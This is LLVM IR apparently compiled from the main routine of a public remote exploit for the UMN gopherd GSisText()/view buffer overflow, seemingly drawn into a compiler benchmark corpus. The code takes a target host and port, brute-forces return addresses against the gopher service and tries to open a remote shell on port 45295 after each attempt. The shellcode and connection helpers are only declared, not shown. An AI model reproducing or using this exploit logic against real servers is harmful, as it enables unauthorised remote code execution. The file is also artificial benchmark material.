; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22894.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22894.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [174 x i8] c"[*] UMN gopherd[2.x.x/3.x.x]: remote buffer overflow exploit.\0A[*] \22UMN gopherd remote GSisText()/view buffer overflow\22\0A[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [35 x i8] c"[!] syntax: %s <hostname[:port]>\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [33 x i8] c"main(): allocating memory failed\00", align 1
@.str.3 = private unnamed_addr constant [43 x i8] c"[*] target: %s:%d - brute: 0x%.8x-0x%.8x\0A\0A\00", align 1
@BASEADDR = common dso_local global i32 0, align 4
@ENDADDR = common dso_local global i32 0, align 4
@SIGINT = common dso_local global i32 0, align 4
@sig_ctrlc = common dso_local global i32 0, align 4
@SIGALRM = common dso_local global i32 0, align 4
@sig_alarm = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [23 x i8] c"(. = 29 byte offset): \00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"!\00", align 1
@.str.6 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.7 = private unnamed_addr constant [25 x i8] c"(brute force limit hit)\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i16 70, i16* %6, align 2
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %10 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([174 x i8], [174 x i8]* @.str, i64 0, i64 0))
  %11 = load i32, i32* %4, align 4
  %12 = icmp slt i32 %11, 2
  br i1 %12, label %13, label %19

13:                                               ; preds = %2
  %14 = load i8**, i8*** %5, align 8
  %15 = getelementptr inbounds i8*, i8** %14, i64 0
  %16 = load i8*, i8** %15, align 8
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.1, i64 0, i64 0), i8* %16)
  %18 = call i32 @exit(i32 1) #3
  unreachable

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = call i64 @strdup(i8* %22)
  %24 = inttoptr i64 %23 to i8*
  store i8* %24, i8** %9, align 8
  %25 = icmp ne i8* %24, null
  br i1 %25, label %28, label %26

26:                                               ; preds = %19
  %27 = call i32 @printe(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.2, i64 0, i64 0), i32 1)
  br label %28

28:                                               ; preds = %26, %19
  store i32 0, i32* %8, align 4
  br label %29

29:                                               ; preds = %48, %28
  %30 = load i32, i32* %8, align 4
  %31 = load i8*, i8** %9, align 8
  %32 = call i32 @strlen(i8* %31)
  %33 = icmp ult i32 %30, %32
  br i1 %33, label %34, label %51

34:                                               ; preds = %29
  %35 = load i8*, i8** %9, align 8
  %36 = load i32, i32* %8, align 4
  %37 = zext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i8, i8* %38, align 1
  %40 = sext i8 %39 to i32
  %41 = icmp eq i32 %40, 58
  br i1 %41, label %42, label %47

42:                                               ; preds = %34
  %43 = load i8*, i8** %9, align 8
  %44 = load i32, i32* %8, align 4
  %45 = zext i32 %44 to i64
  %46 = getelementptr inbounds i8, i8* %43, i64 %45
  store i8 0, i8* %46, align 1
  br label %47

47:                                               ; preds = %42, %34
  br label %48

48:                                               ; preds = %47
  %49 = load i32, i32* %8, align 4
  %50 = add i32 %49, 1
  store i32 %50, i32* %8, align 4
  br label %29

51:                                               ; preds = %29
  %52 = load i8**, i8*** %5, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 1
  %54 = load i8*, i8** %53, align 8
  %55 = call i64 @index(i8* %54, i8 signext 58)
  %56 = icmp ne i64 %55, 0
  br i1 %56, label %57, label %65

57:                                               ; preds = %51
  %58 = load i8**, i8*** %5, align 8
  %59 = getelementptr inbounds i8*, i8** %58, i64 1
  %60 = load i8*, i8** %59, align 8
  %61 = call i64 @index(i8* %60, i8 signext 58)
  %62 = inttoptr i64 %61 to i8*
  %63 = getelementptr inbounds i8, i8* %62, i64 1
  %64 = call zeroext i16 @atoi(i8* %63)
  store i16 %64, i16* %6, align 2
  br label %65

65:                                               ; preds = %57, %51
  %66 = load i16, i16* %6, align 2
  %67 = icmp ne i16 %66, 0
  br i1 %67, label %69, label %68

68:                                               ; preds = %65
  store i16 70, i16* %6, align 2
  br label %69

69:                                               ; preds = %68, %65
  %70 = load i8*, i8** %9, align 8
  %71 = load i16, i16* %6, align 2
  %72 = zext i16 %71 to i32
  %73 = load i32, i32* @BASEADDR, align 4
  %74 = load i32, i32* @ENDADDR, align 4
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.3, i64 0, i64 0), i8* %70, i32 %72, i32 %73, i32 %74)
  %76 = load i32, i32* @SIGINT, align 4
  %77 = load i32, i32* @sig_ctrlc, align 4
  %78 = call i32 @signal(i32 %76, i32 %77)
  %79 = load i32, i32* @SIGALRM, align 4
  %80 = load i32, i32* @sig_alarm, align 4
  %81 = call i32 @signal(i32 %79, i32 %80)
  %82 = load i32, i32* @stderr, align 4
  %83 = call i32 @fprintf(i32 %82, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %7, align 4
  br label %84

84:                                               ; preds = %102, %69
  %85 = load i32, i32* @BASEADDR, align 4
  %86 = load i32, i32* %7, align 4
  %87 = add i32 %85, %86
  %88 = load i32, i32* @ENDADDR, align 4
  %89 = icmp ult i32 %87, %88
  br i1 %89, label %90, label %105

90:                                               ; preds = %84
  %91 = load i32, i32* @stderr, align 4
  %92 = load i8*, i8** %9, align 8
  %93 = load i16, i16* %6, align 2
  %94 = load i32, i32* %7, align 4
  %95 = call i64 @gopher_connect(i8* %92, i16 zeroext %93, i32 %94)
  %96 = icmp ne i64 %95, 0
  %97 = zext i1 %96 to i64
  %98 = select i1 %96, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i64 0, i64 0)
  %99 = call i32 @fprintf(i32 %91, i8* %98)
  %100 = load i8*, i8** %9, align 8
  %101 = call i32 @getshell(i8* %100, i32 45295)
  br label %102

102:                                              ; preds = %90
  %103 = load i32, i32* %7, align 4
  %104 = add i32 %103, 29
  store i32 %104, i32* %7, align 4
  br label %84

105:                                              ; preds = %84
  %106 = load i32, i32* @stderr, align 4
  %107 = call i32 @fprintf(i32 %106, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.7, i64 0, i64 0))
  %108 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @strdup(i8*) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @index(i8*, i8 signext) #1

declare dso_local zeroext i16 @atoi(i8*) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i64 @gopher_connect(i8*, i16 zeroext, i32) #1

declare dso_local i32 @getshell(i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
